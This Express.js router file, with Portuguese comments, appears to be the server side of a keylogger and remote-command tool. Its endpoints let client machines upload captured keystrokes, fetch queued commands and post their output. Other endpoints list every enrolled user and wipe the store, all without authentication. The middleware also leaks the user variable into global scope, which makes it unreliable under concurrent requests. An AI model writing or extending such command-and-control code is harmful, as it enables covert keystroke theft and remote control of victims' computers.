const database = require("../model/database");
const express = require("express");
const router = express.Router();


function checkUser(request, response, next){

    /*
    Middleware para verificar se o usuário está registrado no database. 
    Se não estiver, um novo usuário será criado.
    */

    user = request.params.user;

    if (!database.users[user]){
        database.createUser(user);
    }
    next();
}


router.get("/:user/input", checkUser, function(request, response){

    response.send(database.getInput(user));
});


router.get("/:user/keylogger", checkUser, function(request, response){

    response.send(database.getKeylogger(user).join(" "));
});


router.get("/:user/output", checkUser, function(request, response){

    response.send(database.getOutput(user));
});


router.post("/:user/input", checkUser, function(request, response){

    if ("text" in request.body){
        database.setInput(user, request.body.text);
    }
    response.send("OK");
});


router.post("/:user/keylogger", checkUser, function(request, response){

    if ("text" in request.body){
        database.addKey(user, request.body.text);
    }
    response.send("OK");
});


router.post("/:user/output", checkUser, function(request, response){

    if ("text" in request.body){
        database.setOutput(user, request.body.text);
    }
    response.send("OK");
});


router.get("/users", function(request, response){
    response.send(database.getUsers());
});


router.post("/destroy", function(request, response){

    if (request.body.text === "True"){
        database.destroy();
    }
    response.send("OK");
});


module.exports = router;